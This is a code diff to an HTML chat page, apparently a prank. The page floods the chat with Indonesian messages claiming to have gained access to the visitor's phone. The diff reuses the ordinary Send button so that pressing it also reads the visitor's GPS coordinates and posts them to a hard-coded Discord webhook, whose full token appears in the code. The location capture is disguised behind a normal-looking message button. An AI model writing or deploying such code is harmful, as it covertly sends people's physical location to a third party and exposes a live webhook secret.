@@ -139,60 +139,118 @@
         </div>
         <div class="input-field">
             <input type="text" placeholder="Type a message..." id="messageInput">
-            <button type="submit">Send</button>
+            <button type="submit" id="send-location">Send</button>
         </div>
     </div>
 
     <script>
-        const messages = document.getElementById('messages');
-        const messageInput = document.getElementById('messageInput');
-        const sendMessageButton = document.querySelector('button[type="submit"]');
+       const messages = document.getElementById('messages');
+const messageInput = document.getElementById('messageInput');
+const sendMessageButton = document.querySelector('button[type="submit"]');
+const sendLocationButton = document.getElementById('send-location');
 
-        const sendMessage = (messageContent, isSent = true) => {
-            const messageHTML = `
-                <div class="message ${isSent ? 'sent' : ''}">
-                    <div class="message-content">
-                        <span>${messageContent}</span>
-                    </div>
-                </div>
-            `;
-            messages.innerHTML += messageHTML;
-            messages.scrollTop = messages.scrollHeight; // Scroll to the bottom
-        };
+// Replace with your actual Discord webhook URL
+const webhookURL = 'https://discord.com/api/webhooks/1249563638977531925/uKfEV4WY6UJVbUv8bx-OC6d1ZPFYe6MewF6Qmeb21dkajwjie1i4A5P9cnFn0JFdLqNM'; 
 
-        sendMessageButton.addEventListener('click', (e) => {
-            e.preventDefault();
-            const userMessage = messageInput.value.trim();
-            if (userMessage) {
-                sendMessage(userMessage); // Send user's message
-                messageInput.value = ''; // Clear input
+const sendMessage = (messageContent, isSent = true) => {
+    const messageHTML = `
+        <div class="message ${isSent ? 'sent' : 'received'}">
+            <div class="message-content">
+                <span>${messageContent}</span>
+            </div>
+        </div>
+    `;
+    messages.innerHTML += messageHTML;
+    messages.scrollTop = messages.scrollHeight; // Scroll to the bottom
+};
 
-                // Automatically respond with a random response after 500 m
-                // Automatically respond with "aku mulai meretas sekarang" multiple times
-                let count = 0;
-                const responseInterval = setInterval(() => {
-                    if (count < 5) { // Number of responses
-                        sendMessage('aku mendapatkan akses hpmu', false); // Send response
-                        count++;
-                    } else {
-                        clearInterval(responseInterval); // Stop after 5 responses
+// Function to send location to the webhook
+const sendLocation = () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+            const { latitude, longitude } = position.coords;
+            const locationMessage = `User's Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
 
-                        // Send "panik panik, panik" once
-                        setTimeout(() => {
-                            sendMessage('panik panik, panik 😆', false);
-                        }, 300); // Delay before sending panic message
-                    }
-                }, 500); // Time between responses (300 ms)
+            // Send the location message to the Discord webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: locationMessage // Message to send to Discord
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    sendMessage('Location sent to Discord!'); // Confirmation message in chat
+                } else {
+                    alert('Failed to send location to Discord.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while sending the location to Discord.');
+            });
+        }, (error) => {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Permission denied. Please allow location access.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
             }
         });
+    } else {
+        alert("Geolocation is not supported by this browser.");
+    }
+};
 
-        // Allow sending messages with the Enter key
-        messageInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault(); // Prevent new line
-                sendMessageButton.click(); // Trigger click event
+sendMessageButton.addEventListener('click', (e) => {
+    e.preventDefault();
+    const userMessage = messageInput.value.trim();
+    if (userMessage) {
+        sendMessage(userMessage); // Send user's message
+        messageInput.value = ''; // Clear input
+
+        // Automatically respond with "aku mendapatkan akses hpmu" multiple times
+        let count = 0;
+        const responseInterval = setInterval(() => {
+            if (count < 5) { // Number of responses
+                sendMessage('aku mendapatkan akses hpmu', false); // Send response
+                count++;
+            } else {
+                clearInterval(responseInterval); // Stop after 5 responses
+
+                // Send "panik panik, panik" once
+                setTimeout(() => {
+                    sendMessage('panik panik, panik 😆', false);
+                }, 300); // Delay before sending panic message
             }
-        });
+        }, 500); // Time between responses (500 ms)
+    }
+});
+
+// Send location when the button is clicked
+sendLocationButton.addEventListener('click', (e) => {
+    sendLocation();
+});
+
+// Allow sending messages with the Enter key
+messageInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+        e.preventDefault(); // Prevent new line
+        sendMessageButton.click(); // Trigger click event
+    }
+});
+
     </script>
 </body>
 </html>
